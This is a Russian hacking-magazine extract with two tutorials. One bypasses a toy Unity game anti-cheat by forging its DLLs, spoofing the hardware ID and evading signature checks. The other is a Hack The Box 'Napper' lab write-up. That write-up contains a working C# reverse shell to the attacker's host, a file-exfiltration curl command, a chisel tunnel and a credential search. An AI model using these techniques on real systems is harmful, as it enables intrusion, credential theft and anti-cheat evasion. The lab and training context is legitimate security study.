    const LPCSTR DLL_NAME{ "Quack-internal" };


    const std::string VERSION { "0.6.5" };
    constexpr unsigned IPC_PORT = 5175; // Local machine
communications port
    constexpr unsigned NET_PORT = 7982; // Foreign network
communications port
    static constexpr bool DBG = false;
}


Quack-client\constants.hpp
namespace constants {
    const std::string VERSION{ "0.4.2" };
    const std::string NAME{ "Quack" };
    constexpr unsigned IPC_PORT = 5175; // Local machine
communications port
    constexpr unsigned NET_PORT = 7982; // Foreign network
communications port
    static constexpr bool DBG = false;
}


Quack-client\flashpoint.cpp
http::Client cli{ "localhost", constants::NET_PORT };


Проверяем работоспособность Quack
Для начала нам нужно убедиться в том, что все работает. Для этого так же,
как и автор античита, будем использовать его игру Inertia, инжектор Destroject
и внутренний чит Inertia-cheat. Подключимся к серверу по адресу lh (localhost)
с ником xakep0.





                     Подключение к игровому серверу

В консоли игрового сервера видим, что произошло подключение.





                        Лог игрового сервера

Также в базе данных античита видим, что появилась запись.





                             База данных античита

Начинаем тест. Для этого в командной строке выполним Destroject.exe
Inertia (не забыв рядом положить Inertia-cheat.dll). Видим, что инжект
чита успешно выполнен.





                           Внедренный чит

Активируем чит нажатием клавиши E.





                              Активированный чит

Видим, что чит активирован, но сразу же происходит бан.





                        Сообщение о бане в игре

Посмотрев в БД античита, мы можем узнать, из‑за чего нас забанили.





                         Сообщение о бане в БД

Пробуем сменить никнейм, но нас все равно не пускают.





                               Попытка смены ника

Если попытаться открыть Cheat Engine, он через пару секунд закроется,
но бан не прилетит.


UNITY

Прежде чем расчехлять IDA Pro и приступать к реверсу античита, сделаем
небольшое отступление. Если ты уже заглянул в код чита, то мог заметить
следующий участок:


Inertia-cheat\player.cpp
std::optional<Player> GetPlayer() {
    auto start_point = reinterpret_cast<std::uintptr_t>(
GetModuleHandleA("UnityPlayer.dll"));
    start_point += offsets::player.start_point;


    // Get a pointer to health
    const auto health_ptr = TraverseChain(start_point, offsets::
player.ptr_chain).value_or(0u);


    if (!health_ptr)
        return std::nullopt;


    const auto ammo_ptr = health_ptr - 0x4;


    const Player player{
        .health = reinterpret_cast<std::int32_t*>(health_ptr),
        .ammo = reinterpret_cast<std::int32_t*>(ammo_ptr)
    };


    return player;
}

Здесь стоит обратить внимание на строчку "UnityPlayer.dll". Дело в том,
что игра написана на движке Unity.


Inertia-cheat\data.cpp
namespace offsets {
    PointerChain player = {
        .start_point = 0x13A1340,
        .ptr_chain { 0xC2C, 0xDC8, 0xEA8, 0x18, 0x38 }
    };
}

Также мы имеем цепочку указателей для UnityPlayer.dll. Откроем ее в IDA
Pro по адресу base+0x13A1340. Видим, что здесь размещено значение
переменной из стека и дальше поиск класса игрока идет в стеке.





               UnityPlayer.dll без загруженных отладочных символов

Чтобы облегчить себе задачу, воспользуемся утилитой symchk, которая поз‐
волит получить отладочные символы. Найти ее можно в составе Debugging
Tools for Windows.
   После установки symchk в командной строке выполним следующую коман‐
ду:


symchk.exe /r UnityPlayer.dll /s srv*http://symbolserver.unity3d.com
/v

Загруженные отладочные символы будут расположены здесь:


C:\ProgramData\dbg\sym\UnityPlayer_Win32_mono_x86.pdb\
EAF358F010DF4F28A0807EA7305B4B241\UnityPlayer_Win32_mono_x86.pdb

После загрузим их в IDA Pro.





             UnityPlayer.dll с загруженными отладочными символами

После загрузки отладочных символов картина яснее не стала. Но пожалуй, мы
не будем  углубляться. Я лишь резюмирую, что такой способ подходит
для Unity-чита, если нужно только менять значения в классе игрока, а не отри‐
совывать что‑то (как я делал в прошлой статье). Если хочешь подробнее изу‐
чить читы для Unity, оставлю ссылки.


        WWW

                          •Unity game hacking
                   •A Beginner’s Guide To Hacking Unity Games
                          •Unity Hacking 101: Hacking with Reflection


Также есть полезный инструмент AssetStudio, который позволяет просматри‐
вать текстуры, спрайты, фоны и прочие ассеты игр, написанных на Unity.





                                  Ресурсы игры


Mono
В Unity есть несколько вариантов бэкендов, которые могут исполнять игровой
код. Наша игра исполняется в виртуальной машине Mono, и вся интересу‐
ющая нас информация, в том числе класс игрока, находятся вот в этом фай‐
ле:


Inertia\Inertia_Data\Managed\Assembly-CSharp.dll

Откроем эту библиотеку в dnSpy.





                            Assembly-CSharp.dll

Слева будут указаны все классы игры, среди них мы с легкостью можем найти
класс игрока, как для сетевой игры, так и для одиночной.





                            Класс игрока


IL2CPP
Как вариант, код игры может быть транслирован в C++ при помощи бэкенда
IL2CPP (Intermediate Language To C++) и скомпилирован. Ниже — более под‐
робная схема этого процесса, а подробное описание ты найдешь в докумен‐
тации.





                         Процесс сборки IL2CPP

Если игра собрана с IL2CPP, то в Inertia\Inertia_Data\ мы не найдем
ни папки Managed, ни Assembly-CSharp.dll, а интерес для нас будет пред‐
ставлять GameAssembly.dll. Если мы откроем этот файл в dnSpy, то не уви‐
дим ничего интересного.





                            GameAssembly.dll




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ЧИТ СВОИМИ РУКАМИ
          ОБХОДИМ ПРОСТОЙ АНТИЧИТ
          И ИССЛЕДУЕМ ИГРУ НА UNITY




Все дело в том, что игровая логика была скомпилирована в нативный код.
Впрочем, и на этот случай есть решение — утилита Il2CppDumper, которая
поможет извлечь всю информацию.
   Выполним такую команду:


Il2CppDumper.exe Inertia\GameAssembly.dll Inertia\Inertia_Data\i
l2cpp_data\Metadata\global-metadata.dat Inertia_dump

И получим папку Inertia_dump с содержимым, как на скриншоте.





                          Результат работы Il2CppDumper

Файл dump.cs — восстановленный исходный код Assembly-CSharp.dll.





                          Содержимое dump.cs

DummyDll — папка, которая содержит все восстановленные бинарные файлы.
Это как раз и есть содержимое Managed, в том числе есть и наш Assembly-
CSharp.dll.





                   Assembly-CSharp.dll из папки DummyDll

Прочие важные файлы:
 • il2cpp.h — заголовочный файл со структурами;
 • script.json — скрипт для ida.py, ghidra.py и Il2CppBinaryNinja;
 • stringliteral.json — содержит всю информацию о найденных стро‐
   ках.


ИЗУЧАЕМ И ОБХОДИМ АНТИЧИТ

Для начала посмотрим, что есть в папке с игрой.





                      Содержимое директории игры

 • Identify.dll — некая DLL, назначение которой нам неизвестно;
 • Quack-ac.exe — главный модуль античита;
 • Quack-internal.dll — библиотека, которая будет загружена в кон‐
   текст игры.


Обходим детект по HWID
Для начала исследуем Identify.dll. Откроем ее в IDA Pro и перейдем
в  единственную  экспортируемую  функцию GetHWID. Сокращение HWID
(Hardware Identification) дает нам понять, что функция собирает информацию
о компьютере. Но в этом нам все‑таки нужно убедиться.





                      Экспортируемая функция GetHWID

Перейдем в функцию sub_10003DA0 и увидим следующие константы.





                    Идентификация алгоритма SHA-256

После гугления выясняем, что это часть алгоритма SHA-256. А значит, после
того как соберется информация о железе игрока, от нее будет взят хеш
по алгоритму SHA-256.





            Найденная реализация алгоритма SHA-256 на GitHub

После перейдем в функцию sub_10003590 и снова изучим константы.





               Алгоритм преобразования байтов в HEX-строку

Снова гуглим и узнаём, что эти константы — часть алгоритма перевода бай‐
тов в шестнадцатеричную строку.





   Найденная на GitHub реализация преобразования байтов в HEX-строку

И последнее действие — копирование шестнадцатеричной строки SHA-
256 в аргумент экспортируемой функции.





                      Экспортируемая функция GetHWID

Имея полную картину, мы можем воспроизвести алгоритм, но хеш у нас будет
браться не от HWID, а от рандомного значения. Для реализации возьмем код
из реализации SHA-256.


// Определение экспортируемой функции GetHWID
extern "C" {
    void __declspec(dllexport) GetHWID(char* message) {
        // Объявление переменной для хеша
        SHA256 sha;
        // Инициализация сида от текущего времени для рандома
        srand((unsigned)time(NULL));
        // Получение рандомного значения
        std::string random = std::to_string(rand());
        // Получение SHA-256 для рандомного значения
        sha.update(random);
        // Получение значения хеша
        std::array<uint8_t, 32> digest = sha.digest();
        // Получение шестнадцатеричной строки хеша
        std::string sha256 = SHA256::toString(digest);
        // Присвоение аргументу значения хеша
        for (int i = 0u; i < sha256.length(); ++i) {
            message[i] = sha256[i];
        }
    }
}

Теперь заменим исходную Identify.dll нашей. Но к сожалению, подклю‐
читься не выходит.
   Давай посмотрим, что происходит в окне, где у нас запущен сервер.





                             Логи игрового сервера

Оказывается, Identify.dll — это часть игры, позволяющая идентифици‐
ровать игрока, и к античиту не относится. Что ж, немного промахнулись,
но наши наработки еще пригодятся дальше.


Обходим детект сигнатур
Античит, как и антивирус, умеет проверять сигнатуры бинарных файлов,
в нашем случае — в поисках читов. В нашем случае база сигнатур хранится
внутри Quack-internal.dll.





               Найденные сигнатуры читов в Quack-internal.dll

Выглядит эта база как список строк, где звездочка — это маска, означающая,
что в этом месте может быть любой байт.


55 8B EC 83 EC 2C A1 * * * * 33 C5 89 45 FC 53 56 8B 35 * * * * 57
6A 23 8B F9 FF D6 A8 01 0F 85
68 * * * * FF 15 * * * * 8B 35 * * * * 8B 3D * * * * 03 F0 A1 * * *
* 89 45 C8 3B F8 74 5D
50 A1 * * * * 33 C5 50 8D 45 F4 64 A3 * * * * 6A 19

Изучив код, находим функции, которые отвечают за сигнатурный детект.





                 Идентифицируем алгоритм поиска читов

 1. Инициализируется паттерн.
 2. Паттерн ищется в памяти.
 3. Если есть совпадение, запускается процедура бана.

Теперь нам нужно понять, что менять в нашем чите, чтобы обходить проверку.





          Найденная байтовая последовательность в Inertia-cheat.dll

Есть несколько вариантов: обфускация, виртуализация и изменение парамет‐
ров компиляции кода. Пойдем по самому простому пути — попробуем вык‐
лючить оптимизацию на этапе компиляции.





               Отключаем оптимизацию на этапе компиляции

После компиляции откроем тот же кусок кода и посмотрим, помогло ли
это изменить сигнатуру.





    Новая байтовая последовательность на месте старой в Inertia-cheat.dll

Как видим, это помогло!


55 8B EC 83 EC 2C A1 * * * * 33 C5 89 45 FC 53 56 8B 35 * * * * 57
6A 23 8B F9 FF D6 A8 01 0F 85
55 8B EC 6A FF 68 ED 40 00 10 64 A1 00 00 00 00 50 83 EC 24 A1 08 60
00 10 33 C5 89 45 F0 50 8D 45

Давай для проверки запустим игру, внедрим чит и активируем его.





                      Проверка работоспособности чита

Все успешно работает, и бана нет.


Обходим черный список DNS
В Quack-internal.dll есть проверка доменов, к которым обращался компь‐
ютер игрока.





                Черный список доменов в Quack-internal.dll

Можем при желании убедиться, что это черный список, а не что‑то другое.
Давай поищем функции, которые с ним работают.





                Идентификация алгоритма поиска доменов

 1. Инициализация доменов из черного списка.
 2. Вызов функции получения кеша DNS.
 3. Функция получения доменов из кеша.
 4. Поиск запретных доменов среди закешированных.

Вот как это работает. Если мы сделаем GET-запрос к домену aimware.net,
домен закешируется.


import requests
r = requests.get('https://aimware.net')

Даже если мы не были при этом в игре, при следующем запуске нас забанят.





                         Сообщение о бане в БД

В кеше адрес все равно висит, поэтому нам нужно сбросить кеш DNS
перед следующим запуском игры. Сделать это  легко, просто выполним
команду ipconfig /flushdns.
   Так что лучше не посещать сайты, связанные с читами, в открытую и не
использовать клиенты читов, где нужна авторизация.


             INFO

                           Утилита для просмотра кеша DnsCache





                          Закешированные домены


Обходим принудительное завершение Cheat Engine
Помнишь, что при попытке открыть Cheat Engine он у нас сразу закрывался?
Давай разберемся, почему.
  В Quack-internal.dll мы ничего не находим, но зато в Quack-ac.exe
нашелся список нежелательных программ. Как только античит обнаружит их
в памяти, он немедленно завершит их.





                 Алгоритм поиска нежелательных программ




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ЧИТ СВОИМИ РУКАМИ
          ОБХОДИМ ПРОСТОЙ АНТИЧИТ
          И ИССЛЕДУЕМ ИГРУ НА UNITY





 1. Инициализация списка нежелательных программ.
 2. Передача названий в функцию поиска.
 3. Получение запущенных процессов.
 4. Перебор и сравнение имен процессов.
 5. Если совпадение найдено, процесс завершается.

Воспользуемся Process Explorer и посмотрим, как называется запущенный
процесс Cheat Engine. Варианты могут быть разными, и выбор зависит
от архитектуры процессора. В моем случае это cheatengine-x86_64-SSE4-
AVX2.exe.





                      Имя процесса CE

Попробуем переименовать CE и запустить напрямую.





                       Проверка работоспособности CE

Как видим, все прошло успешно.


Анализируем пакеты
С помощью плагина ClassInfromer для IDA Pro посмотрим, какие статически
слинкованные   библиотеки   используются  в   античите.  Как  видишь,
это nlohmann и httplib. Вторая — явный признак того, что программа будет
что‑то запрашивать или отправлять по сети. Давай узнаем, что именно.





                    Найденные классы в Quack-internal.dll





                     Найденные классы в Quack-ac.exe

Попробуем перехватить пакеты с помощью Wireshark.





              Перехваченные пакеты, пересылаемые на localhost

Это так называемый пакет сердцебиения, который подтверждает, что про‐
цесс античита активен.





             Пакет, пришедший от Quack-internal.dll к Quack-ac.exe

Тот же пакет шлется и на мастер‑сервер.





                     Пакет от Quack-ac.exe к Master server

Пересылается и информация о найденом чите.





       Пакет от Quack-internal.dll к Quack-ac.exe при обнаружении чита

То же — на мастер‑сервер.





         Пакет от Quack-ac.exe к Master server при обнаружении чита

Вот как выглядит информация о найденном домене из черного списка.





  Пакет от Quack-internal.dll к Quack-ac.exe при обнаружении домена
  из черного списка

То же идет и на мастер‑сервер.





  Пакет от Quack-ac.exe к Master server при обнаружении домена из чер‐
  ного списка

Выяснив все это, мы можем изготовить поддельный Identify.dll.


// Определение экспортируемой функции GetHWID
extern "C" {
    void __declspec(dllexport) GetHWID(char* message) {
        // Определение переменной хеша
        std::string sha256 =
"6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b";
        // Присвоение аргументу значения хеша
        for (int i = 0u; i < sha256.length(); ++i) {
            message[i] = sha256[i];
        }
    }
}

Код для нашего Quack-internal.dll.


#include "pch.h"


#include <chrono>
#include <thread>


#include<nlohmann/json.hpp>
#include<httplib.h>


// Для работы с секундами
using namespace std::chrono_literals;


// Функция потока
DWORD WINAPI run(LPVOID lpParam) {
    // Объявление переменных
    httplib::Result res;
    nlohmann::json body{};
    long long uptime;
    // Определение клиента сервера и порта
    httplib::Client cli{ "localhost", 7982 };
    // Время
    std::chrono::time_point<std::chrono::system_clock> time_start =
std::chrono::system_clock::now();
    // Задержка
    std::chrono::seconds delay = 1s;
    // Цикл
    for (std::chrono::seconds seconds = 0s; ; ++seconds) {
        // Вычисление времени соединения
        uptime = std::chrono::duration_cast<std::chrono::seconds>(std
::chrono::system_clock::now() - time_start).count();
        // Пакет
        body["heartbeat"] = {
            {"uuid",
"6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"},
            {"name", "Placeholder"},
            {"arp", ""},
            {"risk", "0"},
            {"uptime", uptime},
            {"blob", {{"Game position", "[Placeholder]"}}}
        };
        // Post-запрос к серверу
        if (res = cli.Post("/", body.dump(), "application/json")) {
            // Успешно ли соединение?
            if (res->status == 200) {
                // В случае успеха заснуть
                std::this_thread::sleep_for(delay);
                // и продолжить выполнение
                continue;
            }
        }
        // Завершение процесса в том случае, если не получается
установить соединение с сервером
        ExitProcess(0);
    }
}


// Главная функция
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Запуск потока
        if (HANDLE thread = CreateThread(nullptr,0,run,hModule,0,
nullptr))
            CloseHandle(thread);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

После компиляции удалим все ненужное и подменим DLL нашими.





                     Финальное содержимое папки игры

В Wireshark будет только пакет сердцебиения к мастер‑серверу.





                 Пакет от нашего Quack-ac.exe к Master server

И в результате все прекрасно работает.





                           Финальный результат


ВЫВОДЫ

Наше приключение подошло к концу: мы обошли античит и убедились в том,
что, имея навыки реверса и программирования, это совсем не трудно. Безус‐
ловно, коммерческие античиты, которые ты встретишь в жизни, будут слож‐
нее: они работают на уровне ядра, накрыты протекторами и могут исполь‐
зовать продвинутые техники обнаружения. Но и их тоже, как ты знаешь,
регулярно обходят. Как именно — обсудим в следующий раз!
ВЗЛОМ





В этом райтапе мы с тобой повысим при‐
вилегии в Windows через вскрытое нами
приложение на Go. Для этого разберемся
с шифрованием, а затем напишем  дек‐
риптор  при  помощи  ChatGPT.   Также             RalfHacker                                                                                             hackerralf8@gmail.com
на  нашем   пути   встретится   бэкдор
Naplistener,   который  мы   используем
для проникновения в систему.


Наша цель — получение прав суперпользователя на машине Napper с учеб‐
ной площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.240  napper.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел всего два открытых порта: 80 и 443 — служба Microsoft IIS 10.0.
При этом поле CommonName сертификата SSL на порте 443 содержит домен‐
ное имя, к которому применяется сертификат. Добавляем этот домен в файл
/etc/hosts и идем смотреть сайт.


10.10.11.240 napper.htb app.napper.htb





                           Главная страница сайта


ТОЧКА ВХОДА

На главной странице много постов. Внимательно изучаем их и находим инс‐
трукцию по Basic-аутентификации на каком‑то ресурсе. В инструкции указаны
учетные данные.





                           Содержимое поста

На этапе разведки, если у нас есть домен, никогда не помешает запустить
сканер поддоменов. Давай сделаем это.
  Для сканирования я использую утилиту ffuf. При запуске указываем сле‐
дующие параметры:
 • -u — URL;
 • -w — словарь;
 • -t — количество потоков;
 • -H — HTTP-заголовок;
 • -fs — фильтр по размеру.


ffuf -u "https://napper.htb/" -H 'Host: FUZZ.napper.htb' -t 128 -w
subdomains-top1million-110000.txt -fs 5602



                       Результат сканирования поддоменов

Спустя пару минут нашли еще один поддомен. Добавляем его в /etc/hosts.


10.10.11.240 napper.htb app.napper.htb internal.napper.htb





                              Basic-авторизация

На сайте нас встречает Basic-аутентификация. Используем найденные ранее
учетные данные и получаем доступ к сайту с единственным постом.





                  Главная страница сайта internal.napper.htb


ТОЧКА ОПОРЫ

Здесь упоминается бэкдор Naplistener в службе Microsoft Exchange.





                           Содержимое поста

Возможно,  этот  бэкдор  присутствует  на  сервере,  поэтому  проверим,
не откроется ли страница /ews/MsExgHealthCheckd.





                         Запросы в Burp History

Такая страница есть, поэтому разберемся, как работает бэкдор. Как указано
в блоге Elastic, страница /ews/MsExgHealthCheckd принимает POST-запрос
и выполняет сборку .NET, закодированную в Base64 и переданную в парамет‐
ре sdafwe3rwe23.





                         Исходный код бэкдора

Для теста я решил проверить, какими будут ответы сервера, если отправить
POST-запрос с нужным параметром и без него.





                          Запрос без параметров





                    Запрос с параметром sdafwe3rwe23

Ответы сервера отличаются, а значит, параметр был обработан. Это сви‐
детельствует о наличии бэкдора на сервере. Теперь напишем реверс‑шелл
на языке C#. В коде должен быть класс Run и соответствующий метод.


using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;


namespace payload
{
 public class Run
 {
 static StreamWriter streamWriter;


 public static void Main(string[] args)
 {
  Run runInstance = new Run();
 }


 public Run() {
  using (TcpClient client = new TcpClient("10.10.16.33", 4321))
  {
   using (Stream stream = client.GetStream())
   {
    using (StreamReader rdr = new StreamReader(stream))
    {
     streamWriter = new StreamWriter(stream);


     StringBuilder strInput = new StringBuilder();


     Process p = new Process();
     p.StartInfo.FileName = "powershell.exe";
     p.StartInfo.CreateNoWindow = true;
     p.StartInfo.UseShellExecute = false;
     p.StartInfo.RedirectStandardOutput = true;
     p.StartInfo.RedirectStandardInput = true;
     p.StartInfo.RedirectStandardError = true;
     p.OutputDataReceived += new DataReceivedEventHandler(
CmdOutputDataHandler);
     p.Start();
     p.BeginOutputReadLine();


     while (true)
     {
      strInput.Append(rdr.ReadLine());
      p.StandardInput.WriteLine(strInput);
      strInput.Remove(0, strInput.Length);
     }
    }
   }
  }
 }


 private static void CmdOutputDataHandler(object sendingProcess,
DataReceivedEventArgs outLine)
 {
  StringBuilder strOutput = new StringBuilder();


  if (!String.IsNullOrEmpty(outLine.Data))
  {
   try
   {
    strOutput.Append(outLine.Data);
    streamWriter.WriteLine(strOutput);
    streamWriter.Flush();
   }
   catch (Exception err) { }
  }
 }
 }
}

После компиляции исполняемого файла его  нужно будет закодировать
в Base64 с помощью PowerShell.


[convert]::ToBase64String((Get-Content -path "payload.exe" -Encoding
byte))

Запускаем листенер на локальном хосте:


rlwrap nc -lvp 4321

И выполняем запрос к серверу, где передаем закодированную сборку .NET.





                            Запрос на сервер

Почти мгновенно получаем бэкконект и забираем первый флаг.





                            Сессия на сервере




                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        HTB NAPPER
              РЕВЕРСИМ ПРИЛОЖЕНИЕ
        НА GO И ПИШЕМ ДЕКРИПТОР ПРИ
               ПОМОЩИ CHATGPT





ПРОДВИЖЕНИЕ

Мы в системе, а значит, пора собирать информацию для повышения при‐
вилегий. Я по традиции буду использовать для этого скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на хост исполняемый файл для Windows и запустим сканирование.
В выводе будет много информации, поэтому ищем только важные моменты,
которые помогут в продвижении.
  В системе есть дополнительный администратор — учетная запись backup.





                          Список пользователей

На хосте работает служба Elasticsearch 8.8.0.



                             Активные службы

Также в каталоге Temp на диске C: есть каталог www, предположительно отно‐
сящийся к веб‑серверу.





                      Содержимое каталога C:\Temp

При изучении этой папки становится понятно, что здесь расположен сайт
internal, но тут не один пост, а два.





                               Посты в блоге

Скрытый пост сообщает о том, что пароль пользователя backup хранится
в базе Elastic.





                           Содержимое поста

Проблема в том, что пароль зашифрован и для работы используется какой‑то
специальный клиент, который расположен во вложенном каталоге.





                 Содержимое каталога internal-laps-alpha

Для загрузки файлов с удаленного хоста очень удобно использовать мой
веб‑сервер с возможностью загрузки файлов. На локальном хосте запускаем
сам веб‑сервер:


python3 HTTPServerWithUpload.py 80

На удаленном хосте, с которого нужно увести файл, для загрузки используем
curl.


C:\Windows\System32\curl.exe -v -X POST http://10.10.16.33/ -H
"Content-Type: multipart/form-data" -F file=@".\a.exe"





                                Загрузка файла

Но для работы с Elasticsearch нам нужны учетные данные.


Пароль от Elasticsearch
Для поиска паролей в файлах Elasticsearch переходим в каталог службы и в
директории data запускаем поиск всех файлов, содержащих  подстроку
passw.


findstr /s /i /m "passw" .\*





                        Список файлов с паролями

Файлов найдено не так много, поэтому просто читаем каждый из них.
Находим учетные данные Elastic вот в таком файле:


.\indices\n5Gtg7mtSVOUFiVHo9w-Nw\0\i ndex\_se.cfs





                       Содержимое файла \_se.cfs

Осталось подключиться к службе. Но так как ее порт открыт только для адре‐
са 127.0.0.1, нам нужно построить сетевой туннель, для чего пригодится ути‐
лита chisel. На локальном хосте запустим сервер, ожидающий подключения
(параметр --reverse) на порт 8888 (параметр -p):


./chisel.bin server -p 8888 --reverse

Теперь на удаленном хосте запустим клиентскую часть. Указываем адрес сер‐
вера и порт для подключения, а также тип туннеля R для ретрансляции тра‐
фика с порта 9200 нашего локального сервера на порт 9200 удаленного сер‐
вера 127.0.0.1.


.\chisel.exe client 10.10.16.33:8888 R:9200:127.0.0.1:9200

В логах сервера мы должны увидеть сообщение о создании сессии.





                                Логи chisel server

Для подключения к Elasticsearch и дальнейшей работы я буду использовать
утилиту elasticvue.





                        Настройки подключения к Elastic





                           Главная страница Elastic




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        HTB NAPPER
              РЕВЕРСИМ ПРИЛОЖЕНИЕ
        НА GO И ПИШЕМ ДЕКРИПТОР ПРИ
               ПОМОЩИ CHATGPT





ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Если перейти на вкладку меню Indices, можно найти две записи.





                               Вкладка Indices

По индексу seed хранится значение поля seed, а по индексу user-00001 —
поле с зашифрованными данными blob. При этом данные меняются приб‐
лизительно раз в минуту.





                              Значение seed





                           Значение user-00001

Теперь загружаем найденный исполняемый файл в дизассемблер с воз‐
можностью декомпилятора (я использую IDA Pro). Функция main_main типич‐
на для Golang. А значит, мы можем использовать особенность строк в Go: они
хранятся не как последовательность символов с null-байтом в конце, а как
структура, содержащая строку и ее длину.
  При запуске программы читаются данные Elastic из файла .env.





                Дизассемблированный код функции main_main

После этого приложение делает запрос к базе и обращается к записи seed,
а затем — к записи user-00001.





                               Запись в базе

Но между ними вызываются функции randStringList, genKey и encrypt.
Чтобы было легче с ними разобраться, пройдем их в режиме отладки. Пер‐
вым делом создадим файл .env, содержащий параметры для подключения
к базе.


ELASTICURI=https://172.16.135.1:9200
ELASTICUSER=elastic
ELASTICPASS=oKHzjZw0EGcRxT2cux5K

А затем перейдем к функции randStringList. Эта функция принимает
в качестве параметра длину генерируемой строки, а возвращает случайную
строку.





               Дизассемблированный код функции randStringList





           Результат функции randStringList (сгенерированная строка)

Как видно из кода, генерируемая строка будет длиной 40 байт (28h). В сле‐
дующий раз эта сгенерированная строка будет использована в функции
main_encrypt, куда также будет передан результат выполнения функции
main_genKey. При этом сама функция main_genKey принимает в качестве
параметра значение seed.





                    Дизассемблированный код приложения

Функцию main_genKey удобнее рассмотреть в декомпилированном виде.
Она начинается с вызова rand.Seed (строка 23), куда передается значение
seed. Эта функция устанавливает зерно для рандома, на основании которого
будут в дальнейшем сгенерированы псевдослучайные данные. Потом будет
сгенерирована  16-значная  псевдослучайная  последовательность  (стро‐
ки 24–32).





                  Декомпилированный код функции genKey

Так, у нас есть созданный на основании seed ключ шифрования и есть слу‐
чайная строка. Эти данные передаются в функцию main_encrypt, где и про‐
исходит шифрование по алгоритму AES CFB.





               Декомпилированный код функции main_encrypt

Чтобы больше понимать код функции шифрования, лучше поискать аналогич‐
ные исходные коды, как, например, в репозитории STGDanny.





                 Исходный код для шифрования AES CFB

В том же репозитории представлена и функция для расшифровки, а нам
это еще пригодится.





                 Исходный код для расшифровки AES CFB

Зашифрованная в функции main_encrypt строка записывается в базу Elastic
для хранения.





                    Дизассемблированный код приложения

А затем создается процесс cmd.exe, выполняющий команду смены пароля
пользователю backup. В качестве пароля будет использоваться сгенери‐
рованная 40-значная строка, которая была зашифрована и записана в базу
Elastic.





                    Дизассемблированный код приложения





                        Параметры команды cmd.exe

Таким образом, мы можем получить пароль пользователя backup, у которого
есть права администратора. Для этого необходимо узнать значение seed,
на его основе сгенерировать ключ, затем получить значение blob и рас‐
шифровать при помощи ключа. Перейдем к написанию кода.


Декриптор
Давай попробуем попросить ChatGPT накидать код, который будет обращать‐
ся к базе и получать нужные значения из базы Elastic.





                            Запрос к ChatGPT

Здесь нужно убрать лишний импорт, а в остальном код полностью рабочий.


package main


import (
 "crypto/tls"
 "encoding/json"
 "fmt"
 "io/ioutil"
 "net/http"
)


func main() {
 url := "https://127.0.0.1:9200/_search?q=*"
 username := "elastic"
 password := "oKHzjZw0EGcRxT2cux5K"


 req, err := http.NewRequest("GET", url, nil)
 if err != nil {
   fmt.Println("Ошибка при создании запроса:", err)
   return
 }


 req.SetBasicAuth(username, password)


 tr := &http.Transport{
   TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 }


 client := &http.Client{Transport: tr}


 resp, err := client.Do(req)
 if err != nil {
   fmt.Println("Ошибка при выполнении запроса:", err)
   return
 }
 defer resp.Body.Close()


 body, err := ioutil.ReadAll(resp.Body)
 if err != nil {
   fmt.Println("Ошибка при чтении тела ответа:", err)
   return
 }


 var response map[string]interface{}
 err = json.Unmarshal(body, &response)
 if err != nil {
   fmt.Println("Ошибка при разборе JSON:", err)
   return
 }


 hits, ok := response["hits"].(map[string]interface{})
 if !ok {
   fmt.Println("Не удалось получить данные hits из ответа")
   return
 }


 hitsArray, ok := hits["hits"].([]interface{})
 if !ok {
   fmt.Println("Не удалось получить массив hits из ответа")
   return
 }


 for _, hit := range hitsArray {
   hitData, ok := hit.(map[string]interface{})
   if !ok {
     fmt.Println("Не удалось получить данные hit из ответа")
     return
   }


   source, ok := hitData["_source"].(map[string]interface{})
   if !ok {
     fmt.Println("Не удалось получить данные _source из ответа")
     return
   }


   seed, ok := source["seed"].(float64)
   if ok {
     fmt.Printf("Значение seed: %v\n", int32(seed))
   }


   blob, ok := source["blob"].(string)
   if ok {
     fmt.Printf("Значение blob: %s\n", blob)
   }
 }
}




                         Значения из базы Elastic

Теперь осталось взять найденный код для расшифровки пароля, добавить
генерацию ключа из seed и объединить с уже имеющимся кодом.


...
       iSeed := int64(0)


       for _, hit := range hitsArray {
   hitData, ok := hit.(map[string]interface{})
   if !ok {
     fmt.Println("Не удалось получить данные hit из ответа")
     return
   }


   source, ok := hitData["_source"].(map[string]interface{})
   if !ok {
     fmt.Println("Не удалось получить данные _source из ответа")
     return
   }


   seed, ok := source["seed"].(float64)
   if ok {
     iSeed = int64(seed)
